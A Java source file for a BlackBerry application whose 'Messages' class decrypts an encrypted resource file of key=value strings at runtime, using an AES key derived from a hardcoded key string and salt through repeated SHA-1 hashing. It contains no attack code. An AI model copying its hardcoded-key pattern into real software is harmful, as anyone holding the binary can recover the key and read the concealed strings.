//#preprocess
package blackberry;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Hashtable;

import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.i18n.MissingResourceException;
import blackberry.config.Cfg;
import blackberry.crypto.EncryptionPKCS5;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.StringUtils;
import blackberry.utils.Utils;

public class Messages {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Messages", DebugLevel.VERBOSE);
    //#endif

    private static Hashtable messages;
    private static boolean initialized;

    private Messages() {
    }

    public synchronized static boolean init() {
        if (initialized) {
            return true;
        }

        try {
            messages = new Hashtable();

            InputStream stream = Messages.class.getClass().getResourceAsStream(
                    "/messages.bin");

            EncryptionPKCS5 encryption = new EncryptionPKCS5(
                    produceKey("0x5333494a32158f52"));

            byte[] decrypted = encryption.decryptData(Utils
                    .inputStreamToBuffer(stream));

            ByteArrayInputStream bais = new ByteArrayInputStream(decrypted);

            String lines = new String(decrypted);

            int posMessages = 0;

            String lastLine = "";
            while (true) {
                String currentLine = StringUtils
                        .getNextLine(lines, posMessages);
                if (currentLine == null) {
                    //#ifdef DEBUG
                    debug.trace("parseLinesConversation null line, posMessage: "
                            + posMessages);
                    //#endif
                    break;
                }
                posMessages += currentLine.length() + 1;

                String[] kv = StringUtils.splitFirst(
                        StringUtils.chop(currentLine), "=");
                //#ifdef DBC
                Check.asserts(kv.length == 2, "wrong number of tokens");
                //#endif

                if (kv.length != 2) {
                    //#ifdef DEBUG
                    debug.error("init len: " + kv.length);
                    //#endif
                    continue;
                }

                //#ifdef DBC
                Check.asserts(!messages.contains(kv[0]), "key already present: "
                        + kv[0]);
                //#endif

                messages.put(kv[0], kv[1]);
                //#ifdef DEBUG
                debug.trace(kv[0] + " -> " + kv[1]);
                //#endif
            }

            initialized = true;
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("init");
            //#endif

            return false;
        }
        return true;

    }

    public static String getString(String key) {
        if (!initialized) {
            if (!init()) {
                return null;
            }
        }
        try {
            //#ifdef DBC
            Check.asserts(messages.containsKey(key), "no key known: " + key);
            //#endif

            String str = (String) messages.get(key);
            return str;
        } catch (MissingResourceException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("getString");
            //#endif

            return '!' + key + '!';
        }
    }

    /**
     * Reads the contents of the key file and converts this into a
     * <code>Key</code>.
     * 
     * @return The <code>Key</code> object.
     * @throws BuildException
     *             If the contents of the key file cannot be read.
     */
    public static byte[] produceKey(String key) {

        try {
            //#ifdef DEBUG
            debug.trace("produceKey key: " + key + " " + key.length());
            //#endif

            String salt = Cfg.RANDOM;

            final SHA1Digest digest = new SHA1Digest();

            for (int i = 0; i < 128; i++) {
                digest.update(salt.getBytes());
                digest.update(key.getBytes());
                digest.update(digest.getDigest());
            }

            byte[] sha1 = digest.getDigest();

            byte[] aes_key = new byte[16];
            System.arraycopy(sha1, 0, aes_key, 0, aes_key.length);

            //#ifdef DEBUG
            debug.trace("produceKey: " + Utils.byteArrayToHex(aes_key));
            //#endif
            return aes_key;
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("produceKey");
            //#endif

            return null;
        }

    }

}
